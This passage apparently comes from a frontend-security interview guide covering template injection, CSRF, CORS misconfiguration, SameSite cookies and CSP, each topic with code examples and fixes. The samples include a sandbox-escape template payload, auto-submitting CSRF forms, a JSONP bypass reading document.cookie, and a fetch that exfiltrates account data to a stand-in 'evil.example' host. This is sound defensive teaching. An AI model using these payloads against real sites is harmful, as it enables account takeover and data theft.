Data vs. template source

The critical distinction: binding user data into an existing template ({{ name }} where name is a variable) is safe — the template structure is fixed by your code. Compiling user-supplied text as if it were template markup (e.g. $scope.$eval(userString), or rendering a string through a template engine's compile() with the string itself coming from user input) is the injection: now the attacker controls the expression language itself.

Why "sandboxed" expression languages have failed repeatedly

AngularJS shipped an expression sandbox intended to prevent access to dangerous globals from within {{ }} expressions. Researchers found multiple bypasses over the years by walking the JavaScript object graph (via constructor, prototype chains) to reach Function or window from inside "sandboxed" expressions, eventually leading the Angular team to remove the sandbox entirely and instead recommend never evaluating untrusted expressions at all. The lesson generalizes: any JS-hosted "expression sandbox" is fighting the fundamentally reflective nature of the language.

Modern guidance

  • Never pass user input into a template-compilation API ($eval, a template engine's compile/render called with a user-supplied template string, new Function(userInput)).
  • Treat user content strictly as data bound into a template your code authored, never as the template source itself.
  • If you truly need user-defined formulas/expressions (e.g. a spreadsheet-like feature), use a purpose-built, formally sandboxed expression evaluator (not a general-purpose templating engine repurposed as one) and still assume determined attackers will probe it.

Code Example

// VULNERABLE: user input becomes the template SOURCE, not a bound value.
// (Illustrative -- historical AngularJS-style expression evaluation.)
function renderUserTemplate(userTemplateString, scope) {
  return $compile(userTemplateString)(scope); // attacker's string IS the template
}
renderUserTemplate("{{constructor.constructor('alert(1)')()}}", $scope); // sandbox-escape shape

// SAFE: user input is DATA bound into a template YOU wrote.
function renderComment(userText) {
  return `<p>${escapeHtml(userText)}</p>`; // userText is a value, not compiled code
}

// SAFE pattern in React -- there is no "compile this string as JSX" API,
// which is exactly why this whole bug class barely exists in React:
function Comment({ text }) {
  return <p>{text}</p>; // text is always treated as a value, never as markup/template source
}

Project Example

A legacy AngularJS admin panel let power users define custom "alert rule" labels containing template expressions for dynamic values (e.g. {{metric.value}}). An attacker with limited access submitted a label containing an expression-sandbox-escape payload and achieved script execution in the context of any admin viewing that rule. The remediation removed end-user ability to author raw expressions entirely, replacing it with a fixed set of named placeholders resolved server-side before display — user input became pure data again.

Senior Engineer Perspective

Most React codebases never call anything like eval or $compile on user strings, so this can feel academic — but the pattern resurfaces anywhere a "low-code" or "custom formula" feature lets users author expressions (spreadsheet cells, dashboard widgets, dynamic report templates), and in codebases embedding older templating libraries. The senior point to make: don't trust a library's claim of a "sandboxed" expression language — sandbox escapes in JS-hosted evaluators are a recurring historical pattern, not a one-off bug, so the architecture should avoid compiling untrusted strings as code in the first place.

SECTION 6 - CSRF DEEP DIVE

Q25. How does CSRF risk change when a SPA uses a Bearer token in an Authorization header instead of a cookie?

ROI: ★★★★★ Frequency: High

Short Answer

Classic CSRF exploits ambient authority — the browser auto-attaching a cookie to a cross-site request. A Bearer token sent via an explicit Authorization header is not auto-attached by the browser; only your own JavaScript can set that header, and cross-origin JS can't read or set headers on your app's storage. This means a pure "token in header, read from memory/localStorage" architecture is largely immune to classic CSRF — but this shifts risk rather than eliminating it: you've traded CSRF exposure for higher XSS exposure, since the token now typically lives somewhere JS-readable.

Detailed Answer

Why the header approach blocks CSRF

A malicious page (evil.com) can make the victim's browser send a request to your API, but it cannot make that request carry an Authorization: Bearer <token> header unless it already knows the token — and Same-Origin Policy prevents it from reading the token out of your app's storage. No ambient credential means no forgeable request.

The trade you actually made

If the token lives in localStorage or a JS-readable variable, a single XSS on your origin can read and exfiltrate it outright — a strictly worse outcome than CSRF, which at most lets an attacker fire specific requests blind, without ever seeing the response or the credential itself. So "switch to Bearer tokens to avoid CSRF" is not a strict security upgrade; it's a different risk profile that assumes your XSS defenses (CSP, sanitization, Trusted Types) are strong.

The hybrid reality

Many real systems still use a cookie for the refresh token (httpOnly, so CSRF-relevant but XSS-safe) while keeping the short-lived access token as an in-memory Bearer value (XSS-exposed only while live, CSRF-immune). This hybrid is deliberately built to minimize both risks simultaneously rather than picking one axis and ignoring the other.

Code Example

// Cookie-based auth: browser attaches this automatically -- CSRF-exposed.
fetch("/api/transfer", { method: "POST", credentials: "include", body: data });
// An attacker's cross-site <form> auto-submit can trigger this identically.

// Bearer-token auth: the header must be set explicitly by YOUR script.
fetch("/api/transfer", {
  method: "POST",
  headers: { Authorization: `Bearer ${accessToken}` }, // attacker's page can't set this
  body: data,
});
// evil.com's auto-submitting <form> cannot replicate this request at all --
// forms can't set custom headers, and evil.com's JS can't read accessToken.

Project Example

A team migrating from a session-cookie API to a token-based mobile-and-web API dropped their CSRF-token middleware entirely, reasoning "we don't use cookies for auth anymore." That was correct for the Bearer-token endpoints — but they'd left one legacy cookie-authenticated admin endpoint running for backward compatibility, which remained fully CSRF-exposed after the "CSRF is solved now" cleanup. Q26. How does the double-submit cookie CSRF pattern work, and where can it go wrong?

ROI: ★★★★ Frequency: Medium

Short Answer

In the double-submit pattern, the server sets a random CSRF token in a readable (non-httpOnly) cookie; the SPA reads that cookie's value with JS and echoes it back as a request header (or body field) on state-changing requests. The server simply checks that the header value matches the cookie value. It works because a cross-site attacker's page can make the cookie ride along automatically, but cannot read the cookie's value (Same-Origin Policy) to also set the matching header — so it can't forge a request that passes both checks.

Detailed Answer

Why it needs no server-side session store

Unlike the synchronizer-token pattern (server stores the token per session and validates against that store), double-submit is stateless — the server only compares two values it already received in the same request. This makes it attractive for stateless/serverless APIs, at the cost of a few subtler failure modes.

Where it breaks

  • Subdomain cookie injection: if an attacker controls any subdomain (or there's a subdomain takeover), they can set a cookie with the same name on the parent domain, potentially overwriting or racing your legitimate CSRF cookie — cookies aren't perfectly origin-scoped, only domain-scoped.
  • Missing SameSite/Secure on the CSRF cookie itself: if the token cookie can be read or set cross-site under some circumstance, the "attacker can't read it" assumption weakens.
  • Comparing cookie to body param sent via a plain HTML form: if your check accepts the token from a form field an attacker's cross-site auto-submitting form could theoretically guess or copy if it were ever exposed elsewhere — the token must never leak into logs, URLs, or referrers.
  • Not scoping the cookie's Path/domain tightly, letting unrelated subdomains observe or race it.

Hardening it

Scope the CSRF cookie with SameSite=Strict (it doesn't need to travel cross-site at all, since JS reads it directly), Secure, and a tight Path; consider signing the token (HMAC) so a cookie collision from a sibling subdomain can't forge a valid-looking value; and never accept the token from anywhere but a custom header (never a URL query param, which leaks into logs/referrers/history).

Code Example

// Server issues a readable CSRF cookie (JS needs to read it -- not httpOnly).
Set-Cookie: csrf_token=9f8a...; Secure; SameSite=Strict; Path=/

// Client reads the cookie and echoes it back as a header.
function getCookie(name) {
  return document.cookie.split("; ").find(r => r.startsWith(name + "="))?.split("=")[1];
}
fetch("/api/transfer", {
  method: "POST",
  credentials: "include",
  headers: { "X-CSRF-Token": getCookie("csrf_token") }, // attacker can't read this cookie to copy it
  body: JSON.stringify(data),
});

// Server check: header must equal cookie (and ideally be HMAC-signed server-side
// to resist a same-name cookie set by a sibling subdomain).
function verifyCsrf(req) {
  const header = req.headers["x-csrf-token"];
  const cookie = req.cookies["csrf_token"];
  return header && cookie && timingSafeEqual(header, cookie);
}

Project Example

A platform's double-submit implementation accepted the CSRF token from either a header or a form-encoded body field, for "flexibility." An old marketing subdomain with a forgotten subdomain-takeover vulnerability let an attacker set a matching csrf_token cookie on the parent domain and craft a cross-site auto-submitting form supplying the same value as a body field — passing the double-submit check entirely. Restricting acceptance to a custom header only (which plain HTML forms cannot set) and fixing the dangling subdomain closed both the specific bug and the underlying design weakness.

Senior Engineer Perspective

The nuance interviewers reward: double-submit's security rests entirely on "the attacker cannot read or set this cookie's value the way your JS can" — anything that weakens that assumption (subdomain issues, accepting the token via a plain form field a form can set) breaks the whole scheme. Contrast this clearly with the synchronizer-token pattern, which trades statelessness for a stronger guarantee (server-side validation against a stored value, immune to cookie-scoping edge cases) — a senior candidate can articulate when each is the better fit.

Q27. Why must state-changing operations never be triggered by a GET request, and how does this relate to CSRF?

ROI: ★★★★ Frequency: Medium

Short Answer

GET requests are trivially forgeable cross-site without any script at all — a plain <img src="https://bank.com/transfer?to=attacker&amount=1000"> on any page the victim merely visits fires the request, and even SameSite=Lax (the modern default) explicitly allows top-level cross-site GET navigations through. If a GET endpoint performs a mutation (delete, transfer, state change), it is CSRF-exploitable via the simplest possible vector — no form, no JS, just an <img>, <link>, or link click. REST semantics (GET = safe/idempotent, side-effect-free) exist partly for exactly this security reason.

Detailed Answer

Why SameSite=Lax doesn't save you here

Lax mode was deliberately designed to still send cookies on top-level GET navigations (clicking a link) to preserve normal browsing UX — "log in once, click email links, still be logged in." That means Lax provides zero protection for a mutating GET; it only blocks cross-site POST/subresource requests. A mutating GET is exploitable by literally any embeddable resource tag, no user interaction beyond loading a page required.

Real-world incidents

Historical CSRF disasters (routers, forums, old webmail "logout"/"delete" links reachable via GET) trace directly to this pattern — an <img> tag in a forum post or email that silently performed an action just by rendering.

The fix

  • Enforce REST semantics: GET only reads, never mutates. Use POST/PUT/PATCH/DELETE for anything with a side effect.
  • Apply CSRF-token/SameSite protections to all mutating verbs, not just POST — PUT/PATCH/DELETE need the same coverage.
  • Even with correct verbs, keep the token/SameSite defenses in place for POST etc. — fixing the verb removes the trivial <img>-tag vector but not full CSRF exposure.

Code Example

// A mutating GET endpoint -- exploitable by ANY embeddable tag, no script needed:
// GET /account/delete?id=123
<img src="https://victim-app.com/account/delete?id=123" style="display:none">
// Simply loading a page containing this tag deletes the account, if the
// victim has an active session cookie -- SameSite=Lax does NOT block this.

// Fix: make it a real mutation over POST/DELETE, protected like any other mutation.
app.delete("/account/:id", requireCsrfToken, (req, res) => { /* ... */ });

// Client:
fetch(`/account/${id}`, {
  method: "DELETE",
  credentials: "include",
  headers: { "X-CSRF-Token": csrfToken },
});

Project Example

A legacy admin tool implemented "quick actions" as plain links: /admin/user/123/deactivate reachable by GET, styled as buttons for convenience. An internal phishing test embedded such a link as a hidden image in a support-ticket reply; several admins who merely opened the ticket unknowingly deactivated another employee's account. Converting every mutating action to a real POST/DELETE behind a CSRF-token check, and auditing the whole admin route table for other GET-based mutations, eliminated the entire vector rather than patching the one reported link.

Senior Engineer Perspective

A senior candidate connects this to HTTP semantics rather than treating it as an isolated rule: GET is defined as safe (no side effects) precisely so that browsers, proxies, crawlers, and link-prefetchers can fetch it freely without consequence — violating that contract doesn't just create a CSRF hole, it breaks prefetching, crawling, and caching assumptions too. Mention that this audit (grep the route table for mutating logic behind a GET handler) is a fast, high-value thing to do in any legacy codebase review.

Q28. What is login CSRF, and why is it dangerous even though the victim isn't authenticated yet?

ROI: ★★★ Frequency: Low-Medium

Short Answer

Login CSRF forges a login request that logs the victim into the attacker's account on the victim's browser, without the victim ever entering credentials or noticing. Because most CSRF defenses only guard state-changing actions taken by an authenticated user, unauthenticated endpoints like login are often left unprotected — letting an attacker silently establish their own session in the victim's browser and later capture whatever the victim enters (payment details, personal data) into what looks like the victim's own account, or track/link the victim's subsequent activity to the attacker's account.

Detailed Answer

The attack flow

  1. Attacker crafts a page with an auto-submitting form that POSTs the attacker's own credentials (or a pre-issued session token) to the victim's-app login endpoint.
  2. Victim visits the attacker's page; their browser submits the forged login form to the real site.
  3. The victim's browser now holds a session cookie for the attacker's account, though the victim doesn't realize whose account they're now "logged into."
  4. If the victim then enters sensitive data (saves a payment method, fills a profile, uploads a document) believing they're using their own session, that data lands in the attacker's account, which the attacker can retrieve later.

Why it's overlooked

Teams often reason "CSRF matters for logged-in actions" and skip protecting the login form itself, since "the victim isn't logged in yet, what's there to forge?" — missing that forging the login itself is the attack.

Defenses

  • Apply the same CSRF-token/SameSite protections to the login endpoint as to any other state-changing endpoint — login changes state (establishes a session), so it qualifies.
  • SameSite=Lax/Strict on the session cookie set at login prevents it from being silently established via a cross-site form POST.
  • Regenerate the session identifier on login regardless (this also defends against session fixation — see below).

Code Example

// Attacker's page -- logs the VICTIM's browser into the ATTACKER's account:
<form action="https://victim-app.com/login" method="POST">
  <input name="username" value="attacker@evil.com">
  <input name="password" value="attackers-own-password">
</form>
<script>document.forms[0].submit()</script>
// Victim's browser now carries a session cookie for the attacker's account.

// Defense: require a CSRF token on the login POST too, and set SameSite
// on the resulting session cookie so a cross-site POST can't establish it silently.
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax

Project Example

A retail site's login form had no CSRF token because "you're not authenticated yet, there's nothing to protect." A red-team exercise demonstrated logging test victims into a pre-created attacker account via a forged cross-site login POST, then observing when victims added a saved credit card to what they believed was their own session. Adding a CSRF token to the login endpoint and setting SameSite=Lax on the session cookie closed the silent-login vector.

Senior Engineer Perspective

This question separates people who understand CSRF as "forging a request" (broad) from people who've memorized it as "forging a mutation while logged in" (narrow, and wrong). The senior answer generalizes: any endpoint that changes server-side state — including establishing a new session — needs CSRF protection, authenticated or not. It's also worth mentioning session-fixation-style follow-on risk: regenerating the session ID on every privilege change (not just login) is good hygiene regardless of the CSRF angle.

Q29. How does mixing permissive CORS with credentialed requests compound CSRF-like risk?

ROI: ★★★★ Frequency: Medium

Short Answer

CORS and CSRF are different mechanisms, but a misconfigured CORS policy can hand an attacker something CSRF alone never gives them: the ability to read the response. Classic CSRF is "blind" — the attacker's page can trigger an authenticated request but never sees the result. If the target API reflects Access-Control-Allow-Origin back to any origin and sets Access-Control-Allow-Credentials: true, an attacker's page can make a credentialed cross-origin request and read the JSON response — turning a blind forgery primitive into full data exfiltration.

Detailed Answer

Why this combination is uniquely dangerous

Browsers specifically forbid the literal combination of Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true to prevent the most naive version of this. But servers that dynamically reflect the request's Origin header back (to "support any origin" without using the literal wildcard) plus set credentials-allowed sidestep that guard entirely — functionally equivalent to "any site, with cookies, can read your API," which is strictly worse than plain CSRF.

Stacking with CSRF

Even without this misconfiguration, an attacker with classic CSRF can still trigger a mutation blind. Add the CORS misconfiguration and they can also trigger a read and see the private data returned — e.g. hitting /api/account cross-origin, with cookies, and reading back the victim's PII, API keys, or session details directly into attacker-controlled JS.

How to verify you're not exposed

  • Never reflect Origin into Access-Control-Allow-Origin without checking it against an explicit allow-list first.
  • If credentials are allowed, Access-Control-Allow-Origin must be one exact, validated origin (never *, never an unchecked reflection) and responses must include Vary: Origin.
  • Ask "does this endpoint need credentialed cross-origin access at all?" — most internal APIs don't, and the safest CORS policy is none.

Code Example

// DANGEROUS combo: any origin, WITH credentials -- an attacker's site can
// read the authenticated response, not just trigger the request blind.
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", req.headers.origin); // reflects anything
  res.header("Access-Control-Allow-Credentials", "true");
  next();
});

// attacker's page (evil.com), with the victim's cookies riding along:
fetch("https://victim-app.com/api/account", { credentials: "include" })
  .then(r => r.json())
  .then(data => fetch("https://evil.example/collect", { method: "POST", body: JSON.stringify(data) }));
// Blocked ONLY if the server's CORS policy correctly rejects evil.com's origin.

// SAFE: exact allow-list, validated before reflecting, with Vary: Origin.
const ALLOWED = new Set(["https://app.example.com"]);
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOWED.has(origin)) {
    res.header("Access-Control-Allow-Origin", origin);
    res.header("Access-Control-Allow-Credentials", "true");
    res.header("Vary", "Origin");
  }
  next();
});

Project Example

A partner-integrations API reflected any Origin header to make onboarding "just work" for partners, and enabled credentials so partner dashboards could call it with the user's existing session. A security review showed any arbitrary website could now read authenticated account data cross-origin — an escalation far beyond the CSRF risk the team had already accepted and mitigated with SameSite cookies. Replacing the reflection with an explicit partner-domain allow-list, validated server-side, closed the data-exfiltration path while preserving the intended partner integrations.

Senior Engineer Perspective

The key distinction to articulate clearly: CSRF defenses (SameSite, tokens) stop an attacker from causing an authenticated action; CORS misconfiguration additionally lets them read the result. A senior candidate treats "reflect Origin + allow credentials" as one of the highest-severity, most common real-world frontend-adjacent misconfigurations, and always asks whether credentialed cross-origin access is even necessary before reaching for it — the safest default for most APIs is no cross-origin credentialed access at all.

Q30. Why is the CSRF token itself sensitive, and how can it leak via the Referer header or browser history?

ROI: ★★★ Frequency: Low-Medium

Short Answer

A CSRF token's entire security value depends on the attacker never learning it. If your app puts the token in a URL query string rather than a header/body, it can leak through the Referer header (sent to any third-party resource the page subsequently loads), browser history, server access logs, proxy logs, and browser extensions — any of which hands the "secret" to someone who shouldn't have it, defeating the token entirely. The fix is simple but frequently missed: CSRF tokens belong in a custom header or request body, never in a URL.

Detailed Answer

How the leak actually happens

If a page at https://app.com/dashboard?csrf=abc123 loads any third-party resource (an ad, an analytics pixel, a font from a CDN), the browser's default Referer behavior can send the full URL, including the query string, to that third party. Now the CDN/ad network's server logs contain a live CSRF token for that user's session. Server/proxy access logs on your own infrastructure capture the same thing, and anyone with log access (or a log-aggregation breach) gets a working token.

Compounding factors

  • Shared/public computers retain the token in browser history indefinitely.
  • Copy-pasting or sharing a URL (support tickets, chat, bookmarks) shares the live token along with it.
  • Browser extensions with broad permissions can read all URLs visited, token included.

The fix

Transmit the token only via a custom request header (e.g. X-CSRF-Token) or a POST body field — never a query parameter. If you must reduce cross-origin Referer leakage generally (defense in depth beyond just the token), set Referrer-Policy: strict-origin-when-cross-origin or stricter, and mark the token cookie/value with a short lifetime so a leaked value is only useful briefly.

Code Example

// LEAKY: token in the URL -- ends up in Referer headers, logs, and history.
<a href="/api/action?csrf_token=abc123...">Do the thing</a>
// If this page also loads e.g. <img src="https://analytics.example/pixel.gif">,
// the browser may send the CURRENT page's full URL (token included) as Referer.

// SAFE: token travels only in a header or body, never a URL.
fetch("/api/action", {
  method: "POST",
  headers: { "X-CSRF-Token": csrfToken }, // never appears in any URL/Referer
  body: JSON.stringify(payload),
});

// Defense in depth: reduce what Referer reveals to third parties globally.
Referrer-Policy: strict-origin-when-cross-origin

Project Example

An older part of an app generated "quick action" links with the CSRF token embedded as a query parameter for simplicity, alongside a page that loaded a third-party support-chat widget. Support-widget server logs (a third party outside the team's control) ended up containing live CSRF tokens for real user sessions, discovered during a vendor security assessment. Moving all CSRF transport to a request header and auditing for any other secret-bearing query parameters closed the leak and removed the class of risk for any future third-party script added to the page.

Senior Engineer Perspective

Interviewers use this to see if you generalize "never put secrets in a URL" beyond the obvious API-key case to any token, including ones your own CSRF middleware issues. A strong answer also connects it to a broader principle: URLs are the least private place to put anything, because they flow through Referer headers, proxy/CDN/WAF logs, browser history, and analytics tools by default — session identifiers, one-time-use links, and CSRF tokens all deserve the same "header or body only" discipline.

Q31. How would you actually test a feature for CSRF vulnerability during a security review?

ROI: ★★★★ Frequency: Medium

Short Answer

Practically: take a real authenticated request (from DevTools/Burp/Postman), strip anything a cross-site attacker couldn't reproduce (custom headers set by your own JS, the CSRF token), and replay it from a different origin using only what a plain HTML form or fetch from another site could send. If the server still executes it, the endpoint is CSRF-vulnerable. Then verify each defense layer independently: does removing the CSRF token get rejected? Does a cross-site request still carry the session cookie despite SameSite?

Detailed Answer

A concrete test checklist

  1. Identify every state-changing endpoint (not just POST — check PUT/PATCH/DELETE and any mutating GET).
  2. For each, capture a legitimate request and note what proves "this came from our app": a CSRF token header/field, a custom header, an Origin/Referer check.
  3. Build a minimal cross-site PoC page (an auto-submitting form for form-encoded endpoints; a fetch for JSON ones, understanding it can't set arbitrary headers cross-site without triggering a CORS preflight the server would then need to also misconfigure) and load it from a different origin while authenticated to the target app in the same browser.
  4. Confirm the request is rejected — check the actual server response, not just "the page looked like it failed," since some issues only show up in incorrect success-status handling.
  5. Independently test each control: remove the CSRF token (should reject), test with third-party cookie/SameSite settings across browsers, and check whether the endpoint validates Origin/Referer as an additional signal.

Common false negatives during testing

A JSON endpoint that "requires" a custom header might feel safe, but if the server also accepts the token from a query parameter or is lenient about content-type, an attacker can often still construct a form-based bypass (e.g. submitting as text/plain to dodge a preflight). Test the actual server-side validation logic, not just the happy-path client code.

Automating it

Tools like OWASP ZAP and Burp Suite have CSRF-specific scanners/PoC generators; CI-level tests can assert that a request missing the CSRF header/token returns 403, catching regressions before they reach production.

Code Example

// Minimal cross-site PoC used to TEST (not attack) a suspected endpoint,
// hosted on a different local port/origin during a review:
<!-- served from http://localhost:9999, target app on http://localhost:3000 -->
<form action="http://localhost:3000/api/account/email" method="POST">
  <input name="email" value="attacker-controlled@evil.example">
</form>
<script>document.forms[0].submit()</script>
// If, with a valid session cookie already in the browser, this succeeds,
// the endpoint is CSRF-vulnerable.

// A CI regression test asserting the CSRF guard actually rejects a missing token:
test("rejects mutation without CSRF token", async () => {
  const res = await request(app).post("/api/account/email").send({ email: "x@y.com" });
  expect(res.status).toBe(403);
});

Project Example

During a pre-launch review, a "change email" endpoint accepted the CSRF token from a header or, for a legacy mobile client, from a JSON body field with no distinction in validation. A cross-site PoC using a form that submitted as Content-Type: text/plain (avoiding a CORS preflight) placed the token value as a guessable-format body field and was accepted — an oversight only found by actually attempting the bypass rather than reading the code and assuming the header requirement was absolute.

Senior Engineer Perspective

The senior habit interviewers look for is testing the actual server behavior, not the intended design — reading "we require a CSRF header" in the code is not equivalent to confirming the server rejects requests without it in every accepted content-type/verb combination. Emphasize building minimal, repeatable PoCs and turning any finding into a permanent automated regression test, so a future refactor can't silently reopen the same hole.

Q32. Chrome's SameSite=Lax-by-default rollout changed cookie behavior for everyone. What broke, and what should you check?

ROI: ★★★ Frequency: Low-Medium

Short Answer

Browsers moved from "no SameSite attribute = sent everywhere" to treating cookies with no explicit SameSite as SameSite=Lax by default. This silently changed behavior for any cookie an app hadn't explicitly configured: cross-site subresource requests, iframes, and non-GET cross-site requests stopped carrying those cookies. Legitimate cross-site integrations (embedded widgets, cross-domain SSO iframes, some payment/checkout flows) broke unless they were updated to explicitly opt into SameSite=None; Secure.

Detailed Answer

Why the change happened

The old default effectively gave every cookie CSRF-relevant "ambient" behavior unless a developer proactively restricted it — an unsafe default that put the security burden on remembering to opt in. Making Lax the default flips the model: apps now have to explicitly opt out to None for cross-site use cases, which is a much safer default posture for the web as a whole.

What legitimately needs SameSite=None

  • Third-party embeddable widgets (chat, payment iframes) that need to read a cookie scoped to their own domain while framed inside another site.
  • Cross-domain SSO flows where an iframe on the app's domain needs to send a cookie belonging to an identity-provider domain.
  • Ad-tech / analytics cookies intentionally meant to be readable across sites (subject to increasing separate restrictions around third-party cookies generally).

Critically, SameSite=None requires Secure (HTTPS-only) — browsers reject a None cookie without it.

What to actually check when auditing

Enumerate every cookie your app or its embedded/embedding integrations set. For each: does it need to travel cross-site? If not, leave it at the safe default (Lax, or Strict for maximally sensitive session cookies). If it does, explicitly set SameSite=None; Secure and make sure the CSRF-token defenses still apply, since None reopens exactly the ambient-authority risk Lax was closing.

Code Example

// Old, implicit default (pre-rollout browsers): sent on every request, any context.
Set-Cookie: session=abc123
// This is now treated as SameSite=Lax automatically -- cross-site
// subresource/iframe/non-GET requests stop carrying it.

// Explicit, safe default for a normal session cookie:
Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly

// Explicit opt-in ONLY for a cookie that genuinely needs cross-site delivery
// (e.g. an embeddable widget's own auth cookie) -- Secure is mandatory here:
Set-Cookie: widget_session=xyz789; SameSite=None; Secure; HttpOnly
// Still pair this with CSRF-token validation server-side, since None
// reintroduces the ambient-authority risk Lax was protecting against.

Project Example

An embedded checkout widget silently stopped maintaining its session inside partner sites' iframes after a browser update, with no code change on the team's side — the cookie it relied on had no explicit SameSite attribute and was reclassified to Lax by the new default, blocking it in the cross-site iframe context. Explicitly setting SameSite=None; Secure on that specific cookie (and only that one — the main app's session cookie stayed at Lax) fixed the widget without reopening CSRF risk on the rest of the app.

Senior Engineer Perspective

This tests whether you track platform-level security defaults changing out from under you, not just app-level code. The senior response is to treat every cookie's SameSite value as an explicit, deliberate decision rather than relying on implicit browser defaults (which have changed once already and could evolve further), and to know precisely which of your cookies have a genuine cross-site need versus which were just never audited. Mention that third-party cookie restrictions generally are an evolving area, and any architecture leaning on cross-site cookies should have a fallback plan.

Q33. Walk through the most important CSP directives beyond script-src — what does each actually control?

ROI: ★★★★ Frequency: Medium

Short Answer

CSP is a family of directives, each governing a different resource type or behavior, and a strong policy sets most of them explicitly rather than leaning on default-src to cover everything. The high-value ones beyond script-src: object-src (blocks Flash/plugin-based XSS vectors), base-uri (stops an injected <base> tag from hijacking relative URLs), frame-ancestors (clickjacking), form-action (stops a form-hijack from submitting to an attacker's endpoint), and connect-src (limits where fetch/XHR/WebSocket can exfiltrate to).

Detailed Answer

Directives worth memorizing

DirectiveControlsWhy it matters
object-src 'none'<object>/<embed>Kills a class of legacy plugin-based script execution; almost always safe to fully disable.

form-action 'self'Where <form> may submitStops an injected form (or a hijacked existing one) from exfiltrating submitted data to an attacker's domain.

default-src is only a fallback for directives you don't specify explicitly — several important directives (notably frame-ancestors, form-action, and historically base-uri in some browsers) either don't fall back to it consistently or are easy to forget are even covered. Explicit is safer than implicit for a security header.

A team shipped a CSP with only script-src and style-src set, assuming default-src 'self' covered the rest. A later injection bug (unrelated to script execution) let an attacker inject a <form> that submitted a checkout page's payment fields to an external domain — form-action had never been restricted, so the CSP did nothing to stop it. Adding form-action 'self', base-uri 'self', and object-src 'none' closed several latent gaps at once, none of which were "script" issues in the traditional sense.

Senior Engineer Perspective

Many candidates can recite script-src; fewer can explain why base-uri and form-action matter, which is exactly why interviewers ask. The senior framing: CSP is not just an "XSS switch," it's a general allow-list system across every resource-fetching and navigation-triggering surface of the page, and a mature policy treats each directive as its own threat model rather than assuming one blanket rule covers everything.

Q34. Nonce-based vs hash-based CSP script allowlisting — when would you choose each?

ROI: ★★★★ Frequency: Medium

Short Answer

Both let specific inline/external scripts run without resorting to 'unsafe-inline'. A nonce (script-src 'nonce-xyz') is a random value generated fresh per HTTP response and stamped on both the header and the matching <script nonce="xyz"> tags — it requires a dynamic backend that can mint a new value every request. A hash (script-src 'sha256-...') is a static SHA hash of an exact inline script's content — it works for static sites/build pipelines with no per-request server logic, but breaks the instant the script's content changes by even one character.

Detailed Answer

When nonces fit

Server-rendered apps (Node/Next.js/Rails/etc.) that can generate a random value per request and inject it both into the response header and into every legitimate inline <script> tag. This is the generally recommended approach for dynamic apps because it scales to any number of inline scripts without listing each one, and combined with 'strict-dynamic' lets nonced scripts load additional trusted scripts dynamically.

When hashes fit

Fully static sites (no server templating step to inject a per-request nonce) or build pipelines that can compute a script's hash at build time and bake it into a static CSP meta tag/header. The catch: any change to the inline script's exact bytes (including whitespace) changes its hash, so this only works well for a small, stable set of inline scripts and needs to be regenerated on every build.

Why never just allow-list by origin instead

Origin allow-lists (script-src https://cdn.example.com) are weaker than either: if that CDN also hosts user-uploadable files, JSONP endpoints, or any attacker-writable path, the allow-list itself becomes an attack surface. Nonces/hashes tie trust to the exact script content or a per-response secret, not to "some domain we mostly trust."

Code Example

// NONCE approach (dynamic server, fresh value every response):
Content-Security-Policy: script-src 'nonce-8f3a1c' 'strict-dynamic'
<script nonce="8f3a1c" src="/app.js"></script>
<script nonce="8f3a1c">window.__CONFIG__ = {...};</script>

// HASH approach (static site, computed at build time):
// sha256 of the exact inline script content below:
Content-Security-Policy: script-src 'sha256-2mZ9x...=='
<script>console.log("static, unchanging inline script");</script>
// Changing even one character of this script invalidates the hash and
// the browser will refuse to run it until the CSP is rebuilt.

// WEAKER: origin allow-list -- trusts the WHOLE origin, not a specific script.
Content-Security-Policy: script-src https://cdn.example.com
// Any attacker-writable path on that CDN (open uploads, old JSONP endpoint)
// becomes a bypass.

Project Example

A statically-generated marketing site adopted hash-based CSP for its handful of inline analytics snippets, computing hashes in the build pipeline and injecting them into a generated <meta> CSP tag — appropriate since there was no per-request server to mint nonces. The main React app, served by a Node SSR layer, used nonces instead since it could generate a fresh value per request; migrating that app to hashes would have meant regenerating and redeploying the CSP on every deploy that touched an inline script, which was rejected as too fragile for a fast-moving codebase.

Senior Engineer Perspective

The senior signal is picking the right tool for the deployment shape rather than reciting "nonces are better." Static sites without per-request rendering genuinely can't do nonces (there's nothing to make them fresh), so hashes are the correct, not lesser, choice there. For dynamic apps, nonces plus 'strict-dynamic' is the stronger default because it doesn't require maintaining a hash list that breaks on every content change. Also flag that a nonce is worthless if it's guessable or reused across responses — it must be cryptographically random and unique per response.

Q35. What are common real-world CSP bypass techniques, and why does 'unsafe-inline' or a loose script-src defeat the whole policy?

ROI: ★★★★ Frequency: Medium

Short Answer

CSP bypasses generally exploit either an overly permissive allow-list (a trusted origin that also hosts attacker-reachable content, like JSONP endpoints or open file uploads) or a policy that still contains 'unsafe-inline'/'unsafe-eval', which simply re-opens the door the policy was meant to close. Classic examples: JSONP callback endpoints on an allow-listed domain that let an attacker execute arbitrary JS by controlling the callback parameter, and old AngularJS's expression sandbox (allowed by a policy permitting Angular's origin) providing a script-execution path CSP never anticipated.

Detailed Answer

The JSONP bypass pattern

If script-src allow-lists https://trusted-cdn.com and that domain also serves a JSONP API (https://trusted-cdn.com/api?callback=anything), an attacker can load <script src="https://trusted-cdn.com/api?callback=alert"> — the response wraps attacker-chosen code in a function call, and because the script's origin matches the allow-list, CSP permits it, even though the actual executed code is fully attacker-controlled.

Why 'unsafe-inline'/'unsafe-eval' gut the policy

'unsafe-inline' permits any inline script, which is exactly the primary thing CSP exists to block — an XSS payload is almost always inline. 'unsafe-eval' permits eval/new Function/string-based setTimeout, reopening a dynamic-code-execution path. A policy with either present provides only marginal protection (still useful for things like frame-ancestors, connect-src), but is not a meaningful XSS mitigation.

Other known bypass classes

  • Dangling markup injection: an attacker injects an unterminated attribute that captures subsequent page content up to the next quote, exfiltrating it via a request even without executing script.
  • Open redirect on an allow-listed domain used as a stepping stone to load attacker content from a trusted origin.
  • Browser extensions and dev-tool bookmarklets, which typically aren't bound by the page's CSP at all.

Code Example

// Policy allow-lists a CDN that ALSO happens to serve a JSONP endpoint:
Content-Security-Policy: script-src https://trusted-cdn.com

// Attacker abuses the JSONP callback param -- origin matches, so CSP allows it,
// but the executed code is entirely attacker-controlled:
<script src="https://trusted-cdn.com/api/data?callback=alert(document.cookie)//"></script>

// A policy still containing 'unsafe-inline' provides ~no XSS protection --
// any injected <script> just runs:
